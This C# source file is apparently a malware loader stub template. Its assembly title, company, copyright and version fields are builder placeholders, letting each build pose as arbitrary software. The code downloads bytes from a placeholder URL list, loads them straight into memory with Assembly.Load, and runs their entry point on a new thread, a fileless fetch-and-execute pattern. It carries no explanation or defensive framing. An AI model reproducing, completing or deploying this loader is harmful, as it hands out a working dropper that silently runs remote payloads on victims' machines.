using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Threading;

[assembly: AssemblyTitle("#Title#")]
[assembly: AssemblyDescription("#Description#")]
[assembly: AssemblyCompany("#Company#")]
[assembly: AssemblyProduct("#Product#")]
[assembly: AssemblyCopyright("#Copyright#")]
[assembly: AssemblyTrademark("#Trademark#")]
[assembly: AssemblyFileVersion("#v1#" + "." + "#v2#" + "." + "#v3#" + "." + "#v4#")]
[assembly: AssemblyVersion("#v1#" + "." + "#v2#" + "." + "#v3#" + "." + "#v4#")]

namespace NameSpace
{
    internal static class NameClass
    {
        private static readonly List<string> _URL_List = new List<string>(new string[] { "#URL#" });

        private static void Main()
        {
            foreach (string _URL in _URL_List.ToArray())
            {
                DownloadData(_URL);

                Thread.Sleep(0x7D0);
            }
        }

        private static void DownloadData(string _URL)
        {
            using (WebClient _Web_Client = new WebClient())
            {
                Thread _Thread = new Thread(new ParameterizedThreadStart(Execute));

                _Thread.Start(_Web_Client.DownloadData(_URL));
            }
        }

        private static void Execute(object _Payload)
        {
            Assembly.Load((byte[])_Payload).EntryPoint.Invoke(null, null);
        }
    }
}